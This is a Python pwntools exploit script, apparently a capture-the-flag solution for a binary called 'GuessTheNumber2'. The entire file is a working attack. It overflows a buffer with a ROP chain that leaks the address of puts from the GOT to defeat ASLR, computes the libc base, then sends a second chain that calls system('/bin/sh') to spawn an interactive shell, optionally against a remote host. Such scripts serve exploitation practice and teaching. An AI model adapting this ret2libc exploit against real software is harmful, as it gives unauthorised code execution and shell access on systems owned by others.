#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('GuessTheNumber2')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+179
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    pop_rdi = 0x401803 # pop rdi; ret;
    
    leak_libc = flat(
        [
            pop_rdi,
            exe.got["puts"],
            exe.plt["puts"],
            exe.sym["main"]
        ]
    )

    payload = b"A"*4 + p64(0) + p64(1) + p32(1) + p32(0) + b"A"*8 + leak_libc

    io.sendlineafter(b"scores:", payload)
    io.sendline(b"0")
    io.sendlineafter(b"!", b"0")
    
    io.recvuntil(b"yet :(")
    io.recvline()
    puts = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = puts - libc.sym["puts"]
    info("puts: %#x", puts)
    info("libc base: %#x", libc.address)

    system = libc.sym["system"]
    sh = next(libc.search(b"/bin/sh\x00"))
    ret = 0x40101a # ret; 

    spawn_shell = flat(
        [
            pop_rdi,
            sh,
            ret,
            system
        ]
    )

    payload = b"A"*4 + p64(0) + p64(1) + p32(1) + p32(0) + b"A"*8 + spawn_shell

    io.sendlineafter(b"scores:", payload)
    io.sendline(b"0")
    io.sendlineafter(b"!", b"0")
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

